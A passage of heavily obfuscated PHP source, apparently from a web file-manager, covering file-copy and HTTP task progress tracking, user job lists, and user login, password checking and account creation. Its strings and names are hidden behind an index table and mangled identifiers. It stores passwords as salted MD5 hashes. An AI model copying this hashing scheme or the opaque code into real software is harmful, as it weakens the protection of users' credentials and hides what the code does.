$¼¼Æ©Ëñ[$®£úŒÃı[1869]] += $Û‹ÀûÂ—[$®£úŒÃı[79]]; $¼¼Æ©Ëñ[$®£úŒÃı[1875]] = $Û‹ÀûÂ—[$®£úŒÃı[87]]; $this->update(1); } public function copyFileStart($ùµ£Î›, $Âª¿Ûƒº, $ÛÚ·õòø, $ğÁò©“–, $›’§œ¼, $••õ‡¿„) { $í¨ãÄ± =& $_SERVER[Î·Ü›öğ]; $×ü†äÏğ = $›’§œ¼; if ($×ü†äÏğ == $GLOBALS[$í¨ãÄ±[1876]]) { $×ü†äÏğ = $GLOBALS[$í¨ãÄ±[1877]]; } $GLOBALS[$í¨ãÄ±[1877]] = $›’§œ¼; $GLOBALS[$í¨ãÄ±[1876]] = $••õ‡¿„; $áÕÏ˜Ÿå =& $this->task; $áÕÏ˜Ÿå[$í¨ãÄ±[1862]] = $×ü†äÏğ; $áÕÏ˜Ÿå[$í¨ãÄ±[1864]] = (int) $ùµ£Î›->size($Âª¿Ûƒº); $áÕÏ˜Ÿå[$í¨ãÄ±[1865]] = 0; $áÕÏ˜Ÿå[$í¨ãÄ±[1164]] = $í¨ãÄ±[12]; $áÕÏ˜Ÿå[$í¨ãÄ±[1866]] = $í¨ãÄ±[12]; $áÕÏ˜Ÿå[$í¨ãÄ±[1867]] = 0; $Ÿâ¨‚²¬ = $áÕÏ˜Ÿå[$í¨ãÄ±[1864]] > 1024 * 1024 * 10 ? !0 : !1; Cache::remove($áÕÏ˜Ÿå[$í¨ãÄ±[477]] . $í¨ãÄ±[1878]); if ($Ÿâ¨‚²¬ && file_exists(get_path_father($ğÁò©“–))) { Cache::set($áÕÏ˜Ÿå[$í¨ãÄ±[477]] . $í¨ãÄ±[1878], $ğÁò©“–); $áÕÏ˜Ÿå[$í¨ãÄ±[1835]] = array($í¨ãÄ±[1879], $í¨ãÄ±[1880]); } $this->update(0, $Ÿâ¨‚²¬); } public static function updateCopyLocalFileSize($åã§¬’) { $Í§‹ê±¢ =& $_SERVER[Î·Ü›öğ]; $İãßßÑò = Cache::get($åã§¬’[$Í§‹ê±¢[477]] . $Í§‹ê±¢[1878]); if (!$İãßßÑò || !file_exists($İãßßÑò)) { return $åã§¬’; } $åã§¬’[$Í§‹ê±¢[1865]] = @filesize($İãßßÑò); $åã§¬’[$Í§‹ê±¢[1869]] += $åã§¬’[$Í§‹ê±¢[1865]]; self::updateTask($åã§¬’); return $åã§¬’; } public function copyFileEnd($ŸÕÁ©ÉÁ, $ƒ‰û§œİ, $İûÂ†Æ©, $Ä¥ÉĞÍã, $ú«’ÒÉ, $˜ÆÛÎÇ) { $‚Ÿü¢´¥ =& $_SERVER[Î·Ü›öğ]; $ì¸Œğá‹ =& $this->task; $ì¸Œğá‹[$‚Ÿü¢´¥[1865]] = $ì¸Œğá‹[$‚Ÿü¢´¥[1864]]; $ì¸Œğá‹[$‚Ÿü¢´¥[1866]] = $‚Ÿü¢´¥[12]; unset($ì¸Œğá‹[$‚Ÿü¢´¥[1835]]); if ($ú«’ÒÉ == $ì¸Œğá‹[$‚Ÿü¢´¥[1862]]) { $ì¸Œğá‹[$‚Ÿü¢´¥[1868]] += $ì¸Œğá‹[$‚Ÿü¢´¥[1864]]; $ì¸Œğá‹[$‚Ÿü¢´¥[1869]] = $ì¸Œğá‹[$‚Ÿü¢´¥[1868]]; $İˆÖûá» = 1; if (isset($ì¸Œğá‹[$‚Ÿü¢´¥[1875]]) && $ì¸Œğá‹[$‚Ÿü¢´¥[1875]] == $ƒ‰û§œİ) { $İˆÖûá» = 0; } $this->update($İˆÖûá»); } else { $this->update(); $ì¸Œğá‹[$‚Ÿü¢´¥[1865]] = 0; } Cache::remove($ì¸Œğá‹[$‚Ÿü¢´¥[477]] . $‚Ÿü¢´¥[1878]); self::log($‚Ÿü¢´¥[1881] . $ƒ‰û§œİ . $‚Ÿü¢´¥[73] . $Ä¥ÉĞÍã . $‚Ÿü¢´¥[288] . $ú«’ÒÉ . $‚Ÿü¢´¥[1882] . $ì¸Œğá‹[$‚Ÿü¢´¥[1862]]); } public function updateFileEnd($ıá‚’ãÑ, $€û–¿±Û) { $ºÜ‘Êôù =& $_SERVER[Î·Ü›öğ]; $—ºñ¡Ç¦ =& $this->task; $—ºñ¡Ç¦[$ºÜ‘Êôù[1862]] = $ıá‚’ãÑ; $—ºñ¡Ç¦[$ºÜ‘Êôù[1864]] = $€û–¿±Û; $—ºñ¡Ç¦[$ºÜ‘Êôù[1868]] += $€û–¿±Û; $—ºñ¡Ç¦[$ºÜ‘Êôù[1869]] = $—ºñ¡Ç¦[$ºÜ‘Êôù[1868]]; $this->update(1); self::log($ºÜ‘Êôù[1883] . $ıá‚’ãÑ); } public function sourceModelCopy($÷ì²Îùî) { $¯®â‚»Ö =& $_SERVER[Î·Ü›öğ]; $ã‰éİ¬´ = $÷ì²Îùî[0]; $Ø°¥·î = $÷ì²Îùî[1]; $¾şªâÇ³ =& $this->task; $this->sourceModelCopyFlag = !0; $¥Ğ‰‘•ä = 0; switch ($ã‰éİ¬´) { case $¯®â‚»Ö[651]: $¥Ğ‰‘•ä = 1; break; case $¯®â‚»Ö[654]: $¾şªâÇ³[$¯®â‚»Ö[1862]] = $Ø°¥·î[$¯®â‚»Ö[32]]; break; case $¯®â‚»Ö[656]: $¥Ğ‰‘•ä = intval($÷ì²Îùî[$¯®â‚»Ö[458]] * 0.4); break; case $¯®â‚»Ö[658]: $¥Ğ‰‘•ä = intval($÷ì²Îùî[$¯®â‚»Ö[458]] * 0.2); break; case $¯®â‚»Ö[660]: $¥Ğ‰‘•ä = intval($÷ì²Îùî[$¯®â‚»Ö[458]] * 0.4); break; } $this->update($¥Ğ‰‘•ä); $this->sourceModelCopyFlag = !1; } public function sourceRemove($¿ç©¯”Å, $Î¨×öË™) { $ëæŠŞŞø =& $_SERVER[Î·Ü›öğ]; $this->sourceModelCopyFlag = !0; $âÚ”»Æ = 1; if (isset($¿ç©¯”Å[$ëæŠŞŞø[82]])) { $âÚ”»Æ = $¿ç©¯”Å[$ëæŠŞŞø[82]][$ëæŠŞŞø[80]]; $âÚ”»Æ = $âÚ”»Æ + $¿ç©¯”Å[$ëæŠŞŞø[82]][$ëæŠŞŞø[81]] + 1; } $this->update($âÚ”»Æ); $this->sourceModelCopyFlag = !1; } public function sourceMove($Õ­ö“…ˆ) { $this->sourceRemove($Õ­ö“…ˆ, !1); } public function curlProgress($öˆÃİÓÒ, $¬ÒåÒÆ¤, $ÈÓÀÔı„, $¶ä»ä¢æ, $ëÈ¦ªøŠ) { $º‘€óè¬ =& $_SERVER[Î·Ü›öğ]; $Ù‘¸… =& $this->task; if ($ëÈ¦ªøŠ > 0) { $Ù‘¸…[$º‘€óè¬[1164]] = $º‘€óè¬[1884]; $Ù‘¸…[$º‘€óè¬[1866]] = $º‘€óè¬[110]; if ($Ù‘¸…[$º‘€óè¬[1864]]) { $Ù‘¸…[$º‘€óè¬[1865]] = $ëÈ¦ªøŠ; } if ($Ù‘¸…[$º‘€óè¬[1867]]) { $Ù‘¸…[$º‘€óè¬[1865]] = $ëÈ¦ªøŠ + $Ù‘¸…[$º‘€óè¬[1867]]; } } else { if ($ÈÓÀÔı„ > 0) { if ($Ù‘¸…[$º‘€óè¬[1864]] == $¬ÒåÒÆ¤) { $Ù‘¸…[$º‘€óè¬[1865]] = $ÈÓÀÔı„; $Ù‘¸…[$º‘€óè¬[1164]] = $º‘€óè¬[1885]; $Ù‘¸…[$º‘€óè¬[1866]] = $º‘€óè¬[1309]; } } } $this->update(); } public function curlProgressStart($œ±²ƒ’ñ) { } public function curlProgressEnd($â£Í××‡) { $¬š •½ƒ =& $_SERVER[Î·Ü›öğ]; $Ü„»ê¤¶ =& $this->task; $Àœ­ƒ”° = curl_getinfo($â£Í××‡); $ã’åïÄ = $Àœ­ƒ”°[$¬š •½ƒ[1886]]; if ($ã’åïÄ == -1) { $ã’åïÄ = $Àœ­ƒ”°[$¬š •½ƒ[1887]]; } if ($Ü„»ê¤¶[$¬š •½ƒ[1866]] == $¬š •½ƒ[110] && $ã’åïÄ) { $Ü„»ê¤¶[$¬š •½ƒ[1867]] += $ã’åïÄ; } $this->update(); } } class TaskHttp extends Task { protected function startAfter() { $÷œÜÙñ =& $_SERVER[Î·Ü›öğ]; $¹ñ¶²ëÎ =& $this->task; $¹ñ¶²ëÎ[$÷œÜÙñ[1888]] = 1; Hook::bind($÷œÜÙñ[1856], array($this, $÷œÜÙñ[1889])); Hook::bind($÷œÜÙñ[1858], array($this, $÷œÜÙñ[1890])); Hook::bind($÷œÜÙñ[1860], array($this, $÷œÜÙñ[1891])); } protected function endAfter() { $Ø‹±³Òë =& $_SERVER[Î·Ü›öğ]; Hook::unbind($Ø‹±³Òë[1856], array($this, $Ø‹±³Òë[1889])); Hook::unbind($Ø‹±³Òë[1858], array($this, $Ø‹±³Òë[1890])); Hook::unbind($Ø‹±³Òë[1860], array($this, $Ø‹±³Òë[1891])); } public function progressStart($‡—‚‚ôÉ) { $ø§ÅÒéğ =& $_SERVER[Î·Ü›öğ]; $÷Ë¾Ìúë = curl_getinfo($‡—‚‚ôÉ); self::log($ø§ÅÒéğ[1892] . $÷Ë¾Ìúë[$ø§ÅÒéğ[384]]); self::valueSet($this->task[$ø§ÅÒéğ[477]], $this->task); } public function progressEnd($ÕÑè‘) { $Ş¨ŸÏà¨ =& $_SERVER[Î·Ü›öğ]; self::log($Ş¨ŸÏà¨[1893] . $this->task[$Ş¨ŸÏà¨[477]]); $this->end(); } public function progress($Ú…‡¸÷, $¨øò´»Í, $‚™œÎí, $Ô·ëŞ™Ç, $Ì¾”­Ç) { $ó°²İÜâ =& $_SERVER[Î·Ü›öğ]; $à°±…ñ´ =& $this->task; if ($Ì¾”­Ç > 0) { $à°±…ñ´[$ó°²İÜâ[1162]] = $à°±…ñ´[$ó°²İÜâ[1162]] == 0 ? $Ô·ëŞ™Ç : $à°±…ñ´[$ó°²İÜâ[1162]]; $à°±…ñ´[$ó°²İÜâ[1811]] = $Ì¾”­Ç; } else { if ($‚™œÎí > 0) { $à°±…ñ´[$ó°²İÜâ[1162]] = $à°±…ñ´[$ó°²İÜâ[1162]] == 0 ? $¨øò´»Í : $à°±…ñ´[$ó°²İÜâ[1162]]; $à°±…ñ´[$ó°²İÜâ[1811]] = $‚™œÎí; } } $this->update(); self::log("\160\162\157\147\162\x65\163\163\x48\164\164\x70\x3a\144\157\x77\x6e\72{$‚™œÎí}\x2f{$¨øò´»Í}\x3b\x20\x75\x70\x6c\157\141\144\x3a{$Ì¾”­Ç}\57{$Ô·ëŞ™Ç}\x3b"); } } goto C‘Ê·›öÄÊ; E×£…œä½À: class UserJobModel extends ModelBaseLight { public $optionType = "\123\171\163\164\x65\155\56\152\157\x62\114\151\163\164"; public $field = array("\156\x61\155\x65", "\144\145\163\143", "\x73\157\x72\164"); const JOB_KEY = "\163\145\x6c\x66\x4a\157\142\x4c\151\x73\x74"; public function listData($ùêóàÄ£ = false, $Áƒë¦à® = "\163\x6f\162\x74", $ÉÖ¬òœÓ = false) { return parent::listData($ùêóàÄ£, $Áƒë¦à®, $ÉÖ¬òœÓ); } public function remove($ †¦ß«“) { return parent::remove($ †¦ß«“); } public function add($ù—‰ö½) { $š°‚×ä“ =& $_SERVER[Î·Ü›öğ]; if ($this->findByName($ù—‰ö½[$š°‚×ä“[32]])) { return !1; } $ù—‰ö½[$š°‚×ä“[2034]] = $this->getSort(); return parent::insert($ù—‰ö½); } private function getSort() { $Û°›£ =& $_SERVER[Î·Ü›öğ]; $Ñ±›’„° = parent::listData(); $øŒ½ğÁ† = array_to_keyvalue($Ñ±›’„°, $Û°›£[12], $Û°›£[2034]); return empty($øŒ½ğÁ†) ? 0 : max($øŒ½ğÁ†) + 1; } public function update($Š¶Ï€´, $ÊõÃÇÈâ) { $Í…ıû†É =& $_SERVER[Î·Ü›öğ]; $Á¾µ™¢¾ = parent::listData($Š¶Ï€´); $¯ŒÜáŸå = $this->findByName($ÊõÃÇÈâ[$Í…ıû†É[32]]); if (!$Á¾µ™¢¾ || $¯ŒÜáŸå && $¯ŒÜáŸå[$Í…ıû†É[477]] != $Á¾µ™¢¾[$Í…ıû†É[477]]) { return !1; } return parent::update($Š¶Ï€´, $ÊõÃÇÈâ); } public function setUserJob($Å‚¬‡ÉÓ, $½–ÒõË‚) { $—üúÊú =& $_SERVER[Î·Ü›öğ]; if (!is_array($½–ÒõË‚)) { $½–ÒõË‚ = array($½–ÒõË‚); } $ç½î£¼ğ = parent::listData(); $È¸™÷ğ = array_to_keyvalue($ç½î£¼ğ, $—üúÊú[32]); $ú°¦ğÇÙ = $—üúÊú[456]; foreach ($½–ÒõË‚ as $Òù€ÂÎ) { if ($È¸™÷ğ[$Òù€ÂÎ]) { $ú°¦ğÇÙ .= $È¸™÷ğ[$Òù€ÂÎ][$—üúÊú[477]] . $—üúÊú[50]; } else { $ºÍ¬Ÿ¾¿ = $this->add($Òù€ÂÎ); $ú°¦ğÇÙ .= $ºÍ¬Ÿ¾¿ . $—üúÊú[50]; } } $ú°¦ğÇÙ = rtrim($ú°¦ğÇÙ, $—üúÊú[50]); Model($—üúÊú[610])->metaSet($Å‚¬‡ÉÓ, self::JOB_KEY, $ú°¦ğÇÙ); } public function getUserJob($ªƒÃÛ©ñ) { $â¢øüü = Model($_SERVER[Î·Ü›öğ][610])->metaGet($ªƒÃÛ©ñ); return $this->getUserJobInfo($â¢øüü[self::JOB_KEY]); } public function getUserJobInfo($ª‘Ú‹î) { $²º‰”Şî =& $_SERVER[Î·Ü›öğ]; $œÈæ’Œ = explode($²º‰”Şî[50], $ª‘Ú‹î); $Ñ««šŠù = parent::listData(); $Ñ««šŠù = array_remove_key($Ñ««šŠù, $²º‰”Şî[234]); $’ßçÂİ¬ = array(); foreach ($œÈæ’Œ as $òİûÆ´†) { if (isset($Ñ««šŠù[$òİûÆ´†])) { $’ßçÂİ¬[] = $Ñ««šŠù[$òİûÆ´†]; } } return $’ßçÂİ¬; } } class UserModel extends ModelBase { protected $tableName = "\165\163\x65\162"; protected $tableMeta = array("\164\x61\142\x6c\x65\116\x61\155\145" => "\x75\x73\145\162\x5f\x6d\x65\164\x61", "\x6d\x65\164\x61\106\151\145\x6c\x64" => "\165\x73\145\x72\111\104"); protected $simpleField = "\x75\163\x65\x72\x49\x44\x2c\156\151\143\153\116\x61\x6d\x65\54\x6e\141\155\x65\54\141\x76\141\164\141\162\54\163\145\x78\54\163\164\141\x74\x75\x73"; const ERROR_USER_NOT_EXISTS = -1; const ERROR_USER_PASSWORD_ERROR = -2; const ERROR_USER_EXIST_NAME = -3; const ERROR_USER_EXIST_PHONE = -4; const ERROR_USER_EXIST_EMAIL = -5; const ERROR_USER_LOGIN_LOCK = -6; const ERROR_IP_NOT_ALLOW = -7; const ERROR_USER_EXIST_NICKNAME = -8; protected function cacheFunctionAlias($œ³¦•œ¥) { $„ı…˜é” =& $_SERVER[Î·Ü›öğ]; $…Î€í“ = $„ı…˜é”[2516]; return array($„ı…˜é”[2091] => array($œ³¦•œ¥[0], $…Î€í“), $„ı…˜é”[2093] => array($œ³¦•œ¥[0], $…Î€í“), $„ı…˜é”[2517] => array($œ³¦•œ¥[0], $…Î€í“)); } protected function getInfo($µƒæŠÚ, $‘ŒÃÑòƒ = false) { $…ç¦™Ğ  = $this->getInfoSimple($µƒæŠÚ); if (!is_array($…ç¦™Ğ )) { return array(); } if ($‘ŒÃÑòƒ) { return $this->_getInfoApply($…ç¦™Ğ ); } return $this->cacheFunctionGet($_SERVER[Î·Ü›öğ][2095], $µƒæŠÚ); } protected function getInfoFull($øô÷ı×³, $¯ñ¿ÈÀè = false) { $²ö›ã = $this->getInfoSimple($øô÷ı×³); if (!is_array($²ö›ã)) { return array(); } if ($¯ñ¿ÈÀè) { return $this->_getInfoApply($²ö›ã, !0); } return $this->cacheFunctionGet($_SERVER[Î·Ü›öğ][2518], $øô÷ı×³); } private function _getInfoApply($ÏŠ•·Õü, $ÚÎ´ÖÚ = false) { $Õ£šı§š =& $_SERVER[Î·Ü›öğ]; if (!$ÏŠ•·Õü) { return $ÏŠ•·Õü; } $îüó«ñ´ = md5($Õ£šı§š[2519] . $ÏŠ•·Õü[$Õ£šı§š[988]] . $Õ£šı§š[2520] . $ÏŠ•·Õü[$Õ£šı§š[32]]); $ÏŠ•·Õü = $this->_listDataApplyItem($ÏŠ•·Õü); $¹ù“¬Ë = Model($Õ£šı§š[1458])->metaGet($ÏŠ•·Õü[$Õ£šı§š[90]][$Õ£šı§š[194]]); $ÏŠ•·Õü[$Õ£šı§š[2521]] = $îüó«ñ´; $ÏŠ•·Õü[$Õ£šı§š[90]][$Õ£šı§š[2304]] = isset($¹ù“¬Ë[$Õ£šı§š[2305]]) ? $¹ù“¬Ë[$Õ£šı§š[2305]] : null; if ($ÚÎ´ÖÚ) { $ÏŠ•·Õü[$Õ£šı§š[552]] = $this->metaGet($ÏŠ•·Õü[$Õ£šı§š[1810]]); } return $ÏŠ•·Õü; } protected function getInfoSimple($ŸôÔ½½¥, $ªäÃ‘ß = false) { $£ÑğÅŸ =& $_SERVER[Î·Ü›öğ]; if (!$ŸôÔ½½¥) { return array(); } if ($ªäÃ‘ß) { $íËØ‚ıı = $this->where(array($£ÑğÅŸ[1810] => intval($ŸôÔ½½¥)))->find(); if (!is_array($íËØ‚ıı)) { return array(); } $íËØ‚ıı[$£ÑğÅŸ[2209]] = Action($£ÑğÅŸ[2210])->parseUrl($íËØ‚ıı[$£ÑğÅŸ[2209]]); return $íËØ‚ıı; } return $this->cacheFunctionGet($£ÑğÅŸ[2096], $ŸôÔ½½¥); } protected function getInfoSimpleOuter($”©©ç“„) { $»™ÆÉ‰¯ =& $_SERVER[Î·Ü›öğ]; if (!$”©©ç“„ || $”©©ç“„ == 0) { return array($»™ÆÉ‰¯[1810] => $»™ÆÉ‰¯[231], $»™ÆÉ‰¯[32] => $»™ÆÉ‰¯[176] . LNG($»™ÆÉ‰¯[2522]) . $»™ÆÉ‰¯[178], $»™ÆÉ‰¯[2209] => STATIC_PATH . $»™ÆÉ‰¯[2523]); } $†¸Ò¤ñè = $this->cacheFunctionGet($»™ÆÉ‰¯[2096], $”©©ç“„); $°Â–ƒ»ì = array_field_key($†¸Ò¤ñè, explode($»™ÆÉ‰¯[50], $this->simpleField)); if (!$°Â–ƒ»ì) { return array($»™ÆÉ‰¯[1810] => $»™ÆÉ‰¯[1303], $»™ÆÉ‰¯[32] => $»™ÆÉ‰¯[176] . LNG($»™ÆÉ‰¯[2524]) . $»™ÆÉ‰¯[178], $»™ÆÉ‰¯[2209] => STATIC_PATH . $»™ÆÉ‰¯[2525]); } $°Â–ƒ»ì[$»™ÆÉ‰¯[2209]] = Action($»™ÆÉ‰¯[2210])->parseUrl($°Â–ƒ»ì[$»™ÆÉ‰¯[2209]]); return $°Â–ƒ»ì; } protected function groupUser($òéõÅ‚Â) { } public static function errorLang($¦Œ¼Å™‚) { $¡åó»éÃ =& $_SERVER[Î·Ü›öğ]; $£Ñéö– = array(self::ERROR_USER_NOT_EXISTS => $¡åó»éÃ[2526], self::ERROR_USER_PASSWORD_ERROR => $¡åó»éÃ[2527], self::ERROR_USER_EXIST_NAME => $¡åó»éÃ[2528], self::ERROR_USER_EXIST_PHONE => $¡åó»éÃ[2529], self::ERROR_USER_EXIST_EMAIL => $¡åó»éÃ[2530], self::ERROR_USER_LOGIN_LOCK => $¡åó»éÃ[2531], self::ERROR_IP_NOT_ALLOW => $¡åó»éÃ[2532], self::ERROR_USER_EXIST_NICKNAME => $¡åó»éÃ[2533]); $óïØ÷íí = LNG($£Ñéö–[$¦Œ¼Å™‚]); if ($¦Œ¼Å™‚ == self::ERROR_USER_LOGIN_LOCK) { $‡£úú‹ = (int) Model($¡åó»éÃ[1414])->get($¡åó»éÃ[2534]); if ($‡£úú‹ > 60) { $óïØ÷íí = str_replace($¡åó»éÃ[91], ceil($‡£úú‹ / 60), $óïØ÷íí); } } return $óïØ÷íí; } protected function metaSet($ ıÇÚ™é, $–Æç÷¥ş = null, $µÒ¨íµ± = null) { $this->clearCache($ ıÇÚ™é); return parent::metaSet($ ıÇÚ™é, $–Æç÷¥ş, $µÒ¨íµ±); } public function getInfoByMeta($©ÇÆÆù, $ô Û¾¦Ú) { $ÄáÓõøö =& $_SERVER[Î·Ü›öğ]; $ÇÂ„†– = Model($ÄáÓõøö[2535])->where(array($ÄáÓõøö[97] => $©ÇÆÆù, $ÄáÓõøö[452] => $ô Û¾¦Ú))->find(); if ($ÇÂ„†–) { return $this->getInfo($ÇÂ„†–[$ÄáÓõøö[1810]]); } return !1; } public function userLoginCheck($¦Â¥¡±Ÿ, $ô¾Í†Œ¬, $¦éÛù­ß = false) { $úî’©¤ =& $_SERVER[Î·Ü›öğ]; $˜’²Ÿ‘ = $this->userLoginFind($¦Â¥¡±Ÿ); if (!$˜’²Ÿ‘) { return UserModel::ERROR_USER_NOT_EXISTS; } if (!$this->userPasswordCheck($˜’²Ÿ‘[$úî’©¤[1810]], $ô¾Í†Œ¬)) { return UserModel::ERROR_USER_PASSWORD_ERROR; } return $¦éÛù­ß ? $this->getInfoFull($˜’²Ÿ‘[$úî’©¤[1810]]) : $this->getInfo($˜’²Ÿ‘[$úî’©¤[1810]]); } public function userLoginFind($œ‘Ãò¨Ş) { $£Ş÷‘ó› =& $_SERVER[Î·Ü›öğ]; $Çİ³ÙßÙ = array($£Ş÷‘ó›[32] => $œ‘Ãò¨Ş, $£Ş÷‘ó›[2317] => $œ‘Ãò¨Ş, $£Ş÷‘ó›[382] => $œ‘Ãò¨Ş, $£Ş÷‘ó›[2536] => $œ‘Ãò¨Ş, $£Ş÷‘ó›[1099] => $£Ş÷‘ó›[1101]); if ($this->nickNameRpt()) { unset($Çİ³ÙßÙ[$£Ş÷‘ó›[2317]]); } return $this->where($Çİ³ÙßÙ)->find(); } public function clearCache($†Ê€‡Â) { $ƒÍĞ¦¬Å =& $_SERVER[Î·Ü›öğ]; $this->cacheFunctionClear($ƒÍĞ¦¬Å[2095], $†Ê€‡Â); $this->cacheFunctionClear($ƒÍĞ¦¬Å[2096], $†Ê€‡Â); $this->cacheFunctionClear($ƒÍĞ¦¬Å[2518], $†Ê€‡Â); } public function userPasswordCheck($È§šñ…Í, $Í«µÕµÎ) { $Ì°€‘şÜ =& $_SERVER[Î·Ü›öğ]; $î¹ÙöúÚ = $this->where(array($Ì°€‘şÜ[1810] => intval($È§šñ…Í)))->find(); $÷Å²Êú¢ = $this->metaGet($È§šñ…Í); $‰µïÊ¸í = isset($÷Å²Êú¢[$Ì°€‘şÜ[2537]]) ? $÷Å²Êú¢[$Ì°€‘şÜ[2537]] : $Ì°€‘şÜ[12]; if (md5($‰µïÊ¸í . trim($Í«µÕµÎ)) !== $î¹ÙöúÚ[$Ì°€‘şÜ[988]]) { return !1; } return !0; } public function userAdd($ûÍçÒÁ) { $Ó‰¯–ã =& $_SERVER[Î·Ü›öğ]; $ÎƒÅ¼üâ = array($Ó‰¯–ã[505] => $ûÍçÒÁ[$Ó‰¯–ã[32]], $Ó‰¯–ã[2538] => $ûÍçÒÁ[$Ó‰¯–ã[2208]], $Ó‰¯–ã[2539] => isset($ûÍçÒÁ[$Ó‰¯–ã[382]]) ? $ûÍçÒÁ[$Ó‰¯–ã[382]] : $Ó‰¯–ã[12], $Ó‰¯–ã[2540] => isset($ûÍçÒÁ[$Ó‰¯–ã[2536]]) ? $ûÍçÒÁ[$Ó‰¯–ã[2536]] : $Ó‰¯–ã[12], $Ó‰¯–ã[2541] => isset($ûÍçÒÁ[$Ó‰¯–ã[2317]]) ? $ûÍçÒÁ[$Ó‰¯–ã[2317]] : $ûÍçÒÁ[$Ó‰¯–ã[32]], $Ó‰¯–ã[2542] => isset($ûÍçÒÁ[$Ó‰¯–ã[2209]]) ? $ûÍçÒÁ[$Ó‰¯–ã[2209]] : $Ó‰¯–ã[12], $Ó‰¯–ã[2543] => isset($ûÍçÒÁ[$Ó‰¯–ã[2544]]) ? $ûÍçÒÁ[$Ó‰¯–ã[2544]] : 1, $Ó‰¯–ã[2545] => $ûÍçÒÁ[$Ó‰¯–ã[988]], $Ó‰¯–ã[2097] => isset($ûÍçÒÁ[$Ó‰¯–ã[1997]]) ? $ûÍçÒÁ[$Ó‰¯–ã[1997]] : 1024 * 1024 * 20, $Ó‰¯–ã[2098] => 0, $Ó‰¯–ã[2546] => 0, $Ó‰¯–ã[2142] => isset($ûÍçÒÁ[$Ó‰¯–ã[839]]) ? $ûÍçÒÁ[$Ó‰¯–ã[839]] : 1); if (!empty($ûÍçÒÁ[$Ó‰¯–ã[1810]])) { $ÎƒÅ¼üâ[$Ó‰¯–ã[1810]] = $ûÍçÒÁ[$Ó‰¯–ã[1810]]; } $Õæ×ø¨ = $this->_checkExist($ûÍçÒÁ); if ($Õæ×ø¨ !== !0) { return $Õæ×ø¨; } if (!empty($ÎƒÅ¼üâ[$Ó‰¯–ã[2209]]) && strlen($ÎƒÅ¼üâ[$Ó‰¯–ã[2209]]) > 255) { $ÎƒÅ¼üâ[$Ó‰¯–ã[2209]] = $Ó‰¯–ã[12]; } $Ïõ²¨¤ı = $this->add($ÎƒÅ¼üâ); $ĞõÆÉÉ = array($Ó‰¯–ã[2545] => $ÎƒÅ¼üâ[$Ó‰¯–ã[988]], $Ó‰¯–ã[2541] => $ÎƒÅ¼üâ[$Ó‰¯–ã[2317]], $Ó‰¯–ã[2547] => $ûÍçÒÁ[$Ó‰¯–ã[2102]]); $this->userEdit($Ïõ²¨¤ı, $ĞõÆÉÉ); Model($Ó‰¯–ã[1458])->userRootAdd($Ïõ²¨¤ı); return $Ïõ²¨¤ı; } protected function userEditTest($ï¦ğÕÈ, $¸ÙØÊº) { return $this->call($_SERVER[Î·Ü›öğ][2548], $ï¦ğÕÈ, $¸ÙØÊº); } protected function userEdit($ßœĞ°Æù, $ÂåÆí†¨) { $Ú ËÅö— =& $_SERVER[Î·Ü›öğ]; $ßÀ¡È• = $this->getInfoSimple($ßœĞ°Æù); if (!$ßÀ¡È•) { return !1; } $¾¥×ó = $this->_checkExist($ÂåÆí†¨, $ßœĞ°Æù); if ($¾¥×ó !== !0) { return $¾¥×ó; } if (isset($ÂåÆí†¨[$Ú ËÅö—[988]]) && trim($ÂåÆí†¨[$Ú ËÅö—[988]]) != $Ú ËÅö—[12]) { $È£“¨×ˆ = $this->metaGet($ßœĞ°Æù); if (empty($È£“¨×ˆ[$Ú ËÅö—[2537]])) { $È£“¨×ˆ[$Ú ËÅö—[2537]] = rand_string(10); Model($Ú ËÅö—[590])->metaSet($ßœĞ°Æù, $Ú ËÅö—[2537], $È£“¨×ˆ[$Ú ËÅö—[2537]]); } $ÂåÆí†¨[$Ú ËÅö—[988]] = md5($È£“¨×ˆ[$Ú ËÅö—[2537]] . trim($ÂåÆí†¨[$Ú ËÅö—[988]])); } else { unset($ÂåÆí†¨[$Ú ËÅö—[988]]); } if (!empty($ÂåÆí†¨[$Ú ËÅö—[2209]]) && strlen($ÂåÆí†¨[$Ú ËÅö—[2209]]) > 255) { $ÂåÆí†¨[$Ú ËÅö—[2209]] = $Ú ËÅö—[12]; } if (isset($ÂåÆí†¨[$Ú ËÅö—[2317]])) { $this->setNamePinyin($ßœĞ°Æù, $ÂåÆí†¨[$Ú ËÅö—[2317]]); } if (isset($ÂåÆí†¨[$Ú ËÅö—[2102]])) { $¹üò€¯Ç = $Ú ËÅö—[1417] . $ßœĞ°Æù; $Úİú£øÒ = $Ú ËÅö—[1415]; $ş¹–Ê· = $ÂåÆí†¨[$Ú ËÅö—[2102]] ? $ÂåÆí†¨[$Ú ËÅö—[2102]] : $Ú ËÅö—[12]; $ÇÆ‚®ö = Model($Ú ËÅö—[1414])->get($¹üò€¯Ç, $Úİú£øÒ); $ÇÆ‚®ö = $ÇÆ‚®ö ? $ÇÆ‚®ö : $Ú ËÅö—[12]; if ($ÇÆ‚®ö != $ş¹–Ê·) { if (!$ş¹–Ê· && $ÇÆ‚®ö) { Model($Ú ËÅö—[1414])->remove($¹üò€¯Ç, $Úİú£øÒ); } else { if ($ş¹–Ê·) { Model($Ú ËÅö—[1414])->set($¹üò€¯Ç, $ş¹–Ê·, $Úİú£øÒ); } } } unset($ÂåÆí†¨[$Ú ËÅö—[2102]]); Model($Ú ËÅö—[610])->metaSet($ßœĞ°Æù, $Ú ËÅö—[2102], $ş¹–Ê·); } if (empty($ÂåÆí†¨)) { return !0; } $this->where(array($Ú ËÅö—[1801] => $ßœĞ°Æù))->save($ÂåÆí†¨); $this->clearCache($ßœĞ°Æù); return !0; } public function setNamePinyin($‰®ËŠí, $³Í’ŸÇ¶ = false) { $åíŒŠ =& $_SERVER[Î·Ü›öğ]; if (!$³Í’ŸÇ¶) { $§¿‘üÒÌ = $this->getInfoSimple($‰®ËŠí); $³Í’ŸÇ¶ = $§¿‘üÒÌ[$åíŒŠ[2317]] ? $§¿‘üÒÌ[$åíŒŠ[2317]] : $§¿‘üÒÌ[$åíŒŠ[32]]; } $ü‰°¥øˆ = Model($åíŒŠ[610]); if (!Input::check($³Í’ŸÇ¶, $åíŒŠ[671])) { return $ü‰°¥øˆ->metaSet($‰®ËŠí, array($åíŒŠ[549] => $åíŒŠ[12], $åíŒŠ[548] => $åíŒŠ[12])); } return $ü‰°¥øˆ->metaSet($‰®ËŠí, array($åíŒŠ[549] => str_replace($åíŒŠ[53], $åíŒŠ[12], Pinyin::get($³Í’ŸÇ¶)), $åíŒŠ[548] => Pinyin::get($³Í’ŸÇ¶, $åíŒŠ[672]))); } private function nickNameRpt() { $¦³âÀÛÍ =& $_SERVER[Î·Ü›öğ]; 